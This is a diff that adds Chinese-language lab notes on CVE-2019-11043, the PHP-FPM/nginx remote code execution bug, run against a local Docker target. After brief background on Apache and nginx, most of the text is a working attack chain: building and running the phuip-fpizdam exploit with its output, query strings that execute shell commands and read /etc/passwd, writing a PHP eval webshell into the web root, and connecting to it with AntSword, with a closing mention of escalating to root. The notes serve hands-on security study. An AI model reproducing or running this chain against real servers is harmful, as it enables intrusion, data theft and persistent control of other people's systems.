@@ -3,3 +3,204 @@ PHP2019的时候在PHP-FPM中在nginx特定配置环境下可以远程执行任�
 
 FPN是用于FastCGI进程管理的进程管理器 用于管理用户请求
 FastCGI 快速通用网关接口
+
+apache是同步的 一个连接对应一个进程 多进程的
+nginx是异步的 多个连接可以对应一个进程 (子进程)
+
+注重性能的用nginx 对性能要求不高要求稳定用apache
+而且apache是模块插拔形式的 可以随便启用
+
+nginx对静态文件处理比较有优势
+动态处理apache比较有优势
+
+而且nginx可以做反向代理 所以nginx和apache可以配合着用
+
+在nginx里面是将请求给到php-fpm之后处理完结果再返回回来
+阿帕奇交给libphp模块解析
+
+Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。特定构造的请求会造成 php-fpm 处理异常，进而导致远程执行任意代码。
+
+php5.6-7.x都有这个漏洞
+
+利用这个漏洞需要用到go语言
+apt -y install golang
+设置代理
+go env -w GOPROXY=https://goproxy.cn
+┌──(root💀tyza66)-[~]
+└─# unzip phuip-fpizdam-master.zip 
+Archive:  phuip-fpizdam-master.zip
+86bc456bd5d53c77ad54a2252dcaaf1345b1a483
+   creating: phuip-fpizdam-master/
+  inflating: phuip-fpizdam-master/LICENSE.txt  
+  inflating: phuip-fpizdam-master/README.md  
+  inflating: phuip-fpizdam-master/ZeroNights2019.pdf  
+  inflating: phuip-fpizdam-master/attack.go  
+  inflating: phuip-fpizdam-master/consts.go  
+  inflating: phuip-fpizdam-master/detect.go  
+  inflating: phuip-fpizdam-master/detect_methods.go  
+  inflating: phuip-fpizdam-master/go.mod  
+  inflating: phuip-fpizdam-master/go.sum  
+  inflating: phuip-fpizdam-master/main.go  
+  inflating: phuip-fpizdam-master/phpini.go  
+   creating: phuip-fpizdam-master/reproducer/
+  inflating: phuip-fpizdam-master/reproducer/Dockerfile  
+  inflating: phuip-fpizdam-master/reproducer/entrypoint  
+  inflating: phuip-fpizdam-master/reproducer/nginx.server.conf  
+  inflating: phuip-fpizdam-master/reproducer/php-fpm.conf  
+ extracting: phuip-fpizdam-master/reproducer/script.php  
+  inflating: phuip-fpizdam-master/requester.go  
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# cd phuip-fpizdam-master 
+┌──(root💀tyza66)-[~/phuip-fpizdam-master]
+└─# ls
+attack.go  detect_methods.go  LICENSE.txt  README.md     ZeroNights2019.pdf
+consts.go  go.mod             main.go      reproducer
+detect.go  go.sum             phpini.go    requester.go
+
+直接在这里go build
+┌──(root💀tyza66)-[~/phuip-fpizdam-master]
+└─# go build  
+go: finding github.com/spf13/cobra v0.0.5
+go: finding github.com/spf13/pflag v1.0.3
+go: finding github.com/inconshreveable/mousetrap v1.0.0
+go: finding github.com/cpuguy83/go-md2man v1.0.10
+go: finding github.com/BurntSushi/toml v0.3.1
+go: finding github.com/spf13/viper v1.3.2
+go: finding github.com/mitchellh/go-homedir v1.1.0
+go: finding gopkg.in/yaml.v2 v2.2.2
+go: finding github.com/russross/blackfriday v1.5.2
+go: finding github.com/mitchellh/mapstructure v1.1.2
+go: finding github.com/hashicorp/hcl v1.0.0
+go: finding github.com/magiconair/properties v1.8.0
+go: finding github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77
+go: finding github.com/pelletier/go-toml v1.2.0
+go: finding github.com/stretchr/testify v1.2.2
+go: finding github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6
+go: finding golang.org/x/sys v0.0.0-20181205085412-a5c9d58dba9a
+go: finding github.com/spf13/cast v1.3.0
+go: finding github.com/coreos/go-semver v0.2.0
+go: finding golang.org/x/crypto v0.0.0-20181203042331-505ab145d0a9
+go: finding gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405
+go: finding github.com/coreos/etcd v3.3.10+incompatible
+go: finding github.com/fsnotify/fsnotify v1.4.7
+go: finding github.com/spf13/afero v1.1.2
+go: finding github.com/davecgh/go-spew v1.1.1
+go: finding golang.org/x/text v0.3.0
+go: finding github.com/spf13/jwalterweatherman v1.0.0
+go: finding github.com/ugorji/go/codec v0.0.0-20181204163529-d75b2dcb6bc8
+go: finding github.com/pmezard/go-difflib v1.0.0
+go: finding github.com/coreos/go-etcd v2.0.0+incompatible
+go: downloading github.com/spf13/cobra v0.0.5
+go: downloading github.com/spf13/pflag v1.0.3
+
+之后装好docker 导入镜像 启动LNMP环境
+我们导入 之后运行
+docker load -i phuip-fpizdam-v4.tar.gz
+docker run --rm -d -p 8080:80 phuip-fpizdam:v4
+
+--rm 容器停止后会自动删除
+-d 后台运行容器并返回容器 ID
+-p 8080:80 将容器的 80 端口映射到宿主机 8080 端口
+
+要触发只要目标地址有一个可以访问的php文件就行了
+
+之后使用
+ ./phuip-fpizdam http://192.168.101.99:8080/script.php
+
+──(root💀tyza66)-[~/phuip-fpizdam-master]
+└─#  ./phuip-fpizdam http://192.168.101.99:8080/script.php
+2025/02/18 17:12:06 Base status code is 200
+2025/02/18 17:12:06 Status code 502 for qsl=1765, adding as a candidate
+2025/02/18 17:12:06 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
+2025/02/18 17:12:06 Attack params found: --qsl 1755 --pisos 98 --skip-detect
+2025/02/18 17:12:06 Trying to set "session.auto_start=0"...
+2025/02/18 17:12:06 Detect() returned attack params: --qsl 1755 --pisos 98 --skip-detect <-- REMEMBER THIS
+2025/02/18 17:12:06 Performing attack using php.ini settings...
+2025/02/18 17:12:06 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2025/02/18 17:12:06 Trying to cleanup /tmp/a...
+2025/02/18 17:12:06 Done!
+
+去污染这个fpm子进程 之后我们可以利用这个被污染的进程实现远程代码执行
+之后就可以在这个文件后加上参数?a=/bin/sh+-c+'which+which'&
+
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+%27which+which%27&
+
+浏览器直接返回/usr/bin/which
+好了 
++代表空格 相当于执行的linux命令是which which
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+%27which+id%27&
+/usr/bin/id
+直接实现了远程代码执行
+
+我们可以进容器里面看看
+docker exec -it e80c9f363904 /bin/bash
+
+看一下tmp目录下多了一个a
+[root@localhost home]# docker exec -it e80c9f363904 /bin/bash
+root@e80c9f363904:/# cd /tmp
+root@e80c9f363904:/tmp# ls
+a  sess_d90bbae60c5d8fc22940970fd33ff0d0
+root@e80c9f363904:/tmp# 
+
+现在懂了 是通过a=xxx 之后由a执行
+<?php echo `$_GET[a]`;return;?>
+相当于
+<?php echo `/bin/sh+-c+'which+which'&`;return;?>
+执行完反引号中的代码之后 将结果返回来
+直接传a=xxx 的时候需要刷新才有结果 因为进程只有一个是污染的
+root@e80c9f363904:/tmp# ps aux |grep php
+root          9  0.0  0.1  84944  6272 ?        Ss   09:11   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
+www-data     15  0.0  0.0  85144  3536 ?        S    09:11   0:00 php-fpm: pool www
+www-data     39  0.0  0.1  85140  4120 ?        S    09:12   0:00 php-fpm: pool www
+www-data     40  0.0  0.1  85140  4272 ?        S    09:12   0:00 php-fpm: pool www
+www-data     41  0.0  0.1  85140  4136 ?        S    09:12   0:00 php-fpm: pool www
+www-data     42  0.0  0.1  85140  4144 ?        S    09:12   0:00 php-fpm: pool www
+root         73  0.0  0.0  11460   724 pts/0    S+   09:40   0:00 grep --color=auto php
+
+如果访问到空白就多刷新几次 以访问到被污染的进程
+http://192.168.101.99:8080/script.php?a=id
+
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+'which+which'&
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+'cat /etc/passwd'&
+会把文件中的内容输出到浏览器
+
+能执行任何指令了 那肯定可以运行反弹控制了
+
+如果一个能用 那证明所有的其实都可以用了
+之后我们试着用蚁剑连接一下
+咱们往网站根目录下先植入一个php文件
+用单引号说明是普通字符不会被解析 用双引号会被识别成标签
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+"echo '<?php phpinfo(); ?>' > /var/www/html/p.php" &
+执行完没有反应 但是我们可以去p.php页面看看
+http://192.168.101.99:8080/p.php
+这样写入是无害的
+
+但是我们写入一句话就是有危害的了
+<?php eval($_POST[tyza66]); ?>
+http://192.168.101.99:8080/script.php?a=/bin/sh+-c+"echo '<?php eval(\$_POST[tyza66]); ?>' > /var/www/html/b.php" &
+
+unzip AntSword-Loader-v4.0.3-linux-x64.zip 
+unzip antSword-master.zip 
+进loader里面
+./AntSword
+点初始化 选择master文件夹
+之后再次启动
+在空白处点击鼠标右键添加数据
+地址填写那个文件的地址
+http://192.168.101.99:8080/b.php
+密码就是那个里面的一句话
+点击测试连接可以测试一下
+之后双击就进去了
+之后点右键还可以开终端
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux e80c9f363904 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ whoami
+www-data
+
+我们是普通用户 但是可以上传下载删除重命名啥的
+如果想干别的需要提权到root
